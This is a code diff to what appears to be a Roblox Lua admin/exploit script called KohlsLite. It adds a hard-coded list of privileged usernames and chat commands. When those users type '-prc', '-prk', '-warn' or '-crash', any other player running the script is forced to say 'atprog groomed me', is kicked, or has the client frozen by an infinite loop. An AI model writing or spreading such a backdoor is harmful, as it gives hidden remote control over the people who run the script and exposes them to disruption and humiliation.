@@ -254,6 +254,16 @@ local specialperms = {
     "dawninja21alt"
 }
 
+-- atprog spexialpermz
+local atprogperms = {
+    "atprog",
+    "IceStuds",
+    "decryptionites",
+    "ripcxo",
+    "grimAuxiliatrix",
+    "undertaker629"
+}
+
 -- New users get blacklisted (prevent crashers)
 local newplrslocked = {} -- don't edit!!
 local newplrautoslock = true -- if new players under 21 days join they get blacklisted
@@ -8324,6 +8334,25 @@ v.Chatted:Connect(function(msg)
                                 -- game:Shutdown()
                 end
 
+                if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                Speak("atprog groomed me")
+                end
+
+
+                if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                pcall(function()
+                                        game.Players.LocalPlayer:Kick("a kohlslite admin kicked you!")
+                                end)
+                end
+
+                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                    Remind("You have been WARNED!")
+                end
+
+                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                     while true do end
+                                -- game:Shutdown()
+                end
 
                 end)
 -- ADMIN
@@ -10307,7 +10336,7 @@ function onPlayerAdded(player)
     end
 
     if (player.Name == "atprog" or player.Name == "IceStuds") and player.Name ~= game.Players.LocalPlayer then
-        Chat("h \n\n\n atprog [OWNER OF PR] joined the server! \n\n\n")
+        Chat("h \n\n\n atprog [KohlsLite Admin] joined the server! \n\n\n")
         print("atprog [OWNER OF PR] joined the server!")
        end
 
